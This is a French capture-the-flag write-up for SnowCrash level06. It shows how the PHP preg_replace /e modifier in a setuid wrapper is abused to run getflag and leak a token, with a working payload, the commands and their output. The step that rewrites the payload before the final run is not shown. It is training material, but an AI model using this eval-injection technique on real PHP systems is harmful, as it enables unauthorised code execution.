$ ls -la
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
On trouve un script php et un binaire

$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

Le binaire execute le script php et le script semble avoir besoin d un argument

$ ./level06 bonjour
PHP Warning:  file_get_contents(bonjour): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4

L'argument semble devoir etre un fichier

Si on cat le .php on obtient:
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>

La fonction x, lit un fichier, met son contenu dans une string, et execute des modificationa via des REGEX.

Le script contient une faille via le modifier "e" de la REGEX
Ce modifier execute l'argument de subsitution avec la fonction eval() qui execute une chaine comme un script php

On va donc essayer de remplacer notre chaine par un executable getflag:

level06@SnowCrash:~$ echo "[x exec(getflag)]" > /tmp/getflag06
level06@SnowCrash:~$ ./level06 /tmp/getflag06
exec(getflag)

Pour acceder a la valeur de la variable retourn√©e , la syntaxe est: {${function()}}
level06@SnowCrash:~$ ./level06 /tmp/getflag06
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
